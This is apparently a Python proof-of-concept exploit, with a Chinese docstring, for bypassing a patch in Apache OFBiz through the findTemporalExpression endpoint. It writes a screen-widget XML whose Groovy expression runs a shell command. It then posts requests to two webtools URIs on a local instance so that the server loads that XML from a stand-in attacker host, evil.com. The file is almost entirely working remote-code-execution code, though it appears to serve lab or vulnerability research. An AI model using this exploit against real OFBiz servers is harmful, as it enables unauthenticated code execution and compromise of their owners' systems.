# -*- coding: utf-8 -*-
"""OFBiz 3003 补丁绕过：findTemporalExpression 姊妹向量（不同入口+不同参数名，双锚全落空）。"""
import io
import sys

sys.path.insert(0, "..")
from common import session  # noqa: E402

xml = """<?xml version="1.0" encoding="UTF-8"?>
<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns="http://ofbiz.apache.org/Widget-Screen" xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd">
    <screen name="StatsDecorator">
        <section>
            <actions>
                <set value="${groovy:'touch /tmp/bypass_temporal_rce'.execute()}"/>
            </actions>
        </section>
    </screen>
</screens>
"""
io.open(r"..\..\infrastructure\www\payloads\ofbiz_bypass_r3.xml", "w",
        encoding="utf-8").write(xml)

s = session()
for uri in ["/webtools/control/main/findTemporalExpression",
            "/webtools/control/forgotPassword/findTemporalExpression"]:
    r = s.post("https://127.0.0.1:18381" + uri,
               data={"tempExprDecoratorLocation":
                     "http://evil.com:8000/payloads/ofbiz_bypass_r3.xml"},
               timeout=30, allow_redirects=False)
    print(uri, "->", r.status_code, len(r.content))
